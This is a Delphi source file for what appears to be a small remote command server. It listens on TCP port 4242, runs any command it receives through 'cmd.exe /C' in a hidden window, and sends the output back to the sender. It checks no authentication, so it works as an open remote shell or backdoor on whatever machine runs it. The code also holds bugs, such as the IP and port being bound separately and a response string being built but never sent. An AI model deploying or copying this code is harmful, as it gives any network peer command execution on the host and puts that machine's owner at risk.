unit CmdSrv;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, IdBaseComponent, IdComponent,
  IdCustomTCPServer, IdTelnetServer,IDContext, IdTCPConnection, IdTCPClient,
  IdTCPServer,Winsock ;

type
  TfrmCmdServer = class(TForm)
    IdTCPServer1: TIdTCPServer;
    IdTCPClient1: TIdTCPClient;

    function GetDosOutput(CommandLine: string; Work: string): string;
    function MemoryStreamToString(M: TMemoryStream): string;
    function GetIPAddress():String;
    function GetSysDir: string;

    procedure IdTCPServer1Execute(AContext: TIdContext);
    procedure SendResult(Res:string);
    procedure FormCreate(Sender: TObject);
    procedure SendSysDirToClient(Comn : string);
    procedure SendCmdResultToClient(Cmd : string);

  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  frmCmdServer: TfrmCmdServer;
  MyIP,MyPortNumber,ClientIP,Output,Sys32Dir,ClientPort : string;

implementation

{$R *.dfm}

procedure TfrmCmdServer.SendResult(Res:string);
var
SndBuff : TMemoryStream;
SndText : string;
StrLen : integer;
begin
IdTCPClient1.Host := ClientIP;
IdTCPClient1.Port := StrToInt(ClientPort);
IdTCPClient1.Connect;

SndText := Trim(Res);
StrLen := Length(SndText);

SndBuff := TMemoryStream.Create;
SndBuff.Write(SndText[1],StrLen * SizeOf(SndText[1]));
SndBuff.Position := 0;

IdTCPClient1.IOHandler.Write(SndBuff,0,true);
IdTCPClient1.Disconnect;
end;

procedure TfrmCmdServer.FormCreate(Sender: TObject);
begin
MyIP := GetIPAddress;
Sys32Dir := GetSysDir;
MyPortNumber := '4242';
IdTCPServer1.Bindings.Add.IP := MyIP;
IdTCPServer1.Bindings.Add.Port := StrToInt(MyPortNumber);
IdTCPServer1.Active := true;
end;

function TfrmCmdServer.GetIPAddress():String;
type
  pu_long = ^u_long;
var
  varTWSAData : TWSAData;
  varPHostEnt : PHostEnt;
  varTInAddr : TInAddr;
  namebuf : Array[0..255] of AnsiChar;
begin
  If WSAStartup($101,varTWSAData) <> 0 Then
  Result := 'No. IP Address'
  Else Begin
    gethostname(namebuf,sizeof(namebuf));
    varPHostEnt := gethostbyname(namebuf);
    varTInAddr.S_addr := u_long(pu_long(varPHostEnt^.h_addr_list^)^);
    Result := inet_ntoa(varTInAddr);
  End;
  WSACleanup;
end;


function TfrmCmdServer.GetDosOutput(CommandLine: string; Work: string): string;
var
  SA: TSecurityAttributes;
  SI: TStartupInfo;
  PI: TProcessInformation;
  StdOutPipeRead, StdOutPipeWrite: THandle;
  WasOK: Boolean;
  Buffer: array[0..255] of AnsiChar;
  BytesRead: Cardinal;
  WorkDir: string;
  Handle: Boolean;
begin
  Result := '';
  with SA do begin
    nLength := SizeOf(SA);
    bInheritHandle := True;
    lpSecurityDescriptor := nil;
  end;
  CreatePipe(StdOutPipeRead, StdOutPipeWrite, @SA, 0);
  try
    with SI do
    begin
      FillChar(SI, SizeOf(SI), 0);
      cb := SizeOf(SI);
      dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
      wShowWindow := SW_HIDE;
      hStdInput := GetStdHandle(STD_INPUT_HANDLE); // don't redirect stdin
      hStdOutput := StdOutPipeWrite;
      hStdError := StdOutPipeWrite;
    end;
    WorkDir := Work;
    Handle := CreateProcess(nil, PChar('cmd.exe /C ' + CommandLine),
                            nil, nil, True, 0, nil,
                            PChar(WorkDir), SI, PI);
    CloseHandle(StdOutPipeWrite);
    if Handle then
      try
        repeat
          WasOK := ReadFile(StdOutPipeRead, Buffer, 255, BytesRead, nil);
          if BytesRead > 0 then
          begin
            Buffer[BytesRead] := #0;
            Result := Result + Buffer;
          end;
        until not WasOK or (BytesRead = 0);
        WaitForSingleObject(PI.hProcess, INFINITE);
      finally
        CloseHandle(PI.hThread);
        CloseHandle(PI.hProcess);
      end;
  finally
    CloseHandle(StdOutPipeRead);
  end;
end;

function TfrmCmdServer.GetSysDir: string;
var
  Buffer: array[0..MAX_PATH] of Char;
begin
   GetSystemDirectory(Buffer, MAX_PATH - 1);
   SetLength(Result, StrLen(Buffer));
   Result := Buffer;
end;

procedure TfrmCmdServer.IdTCPServer1Execute(AContext: TIdContext);
var
  RcvTxt,Command: string;
  RcvBuff: TMemoryStream;
begin
  RcvBuff:= TMemoryStream.Create;

  AContext.Connection.IOHandler.ReadStream(RcvBuff, -1, False);
  ClientIP := AContext.Connection.Socket.Host;
  RcvBuff.Position := 0;

  RcvTxt := MemoryStreamToString(RcvBuff);

  Command := Copy(RcvTxt, 1, 5);

   if (Command = 'SYSDR') then begin
      SendSysDirToClient(RcvTxt);
   end;
   if (Command = 'DOCMD') then begin
      SendCmdResultToClient(RcvTxt);
   end;


 RcvBuff.Free;

end;

procedure TfrmCmdServer.SendSysDirToClient(Comn : string);
var
sIndex : integer;
s : string;
begin
sIndex := Pos(']',Comn);
ClientPort := Copy(Comn,7,sIndex - 7);
s := 'SYSDR' + '[' + Sys32Dir + ']';
SendResult(s);
end;

procedure TfrmCmdServer.SendCmdResultToClient(Cmd : string);
var
sIndex : integer;
path,comand,r : string;
begin
sIndex := Pos(']',Cmd);
path := Copy(Cmd,7,sIndex - 7);
Delete(Cmd,1,sIndex);
sIndex := Pos(']',Cmd);
comand := Copy(Cmd,1,sIndex - 1);

output := GetDosOutput(comand,path);

r := 'DOCMD' + '[' + output + ']' ;

SendResult(output);

output := '';


end;

function TfrmCmdServer.MemoryStreamToString(M: TMemoryStream): string;
begin
  SetString(Result, PChar(M.Memory), M.Size div SizeOf(Char));
end;

end.
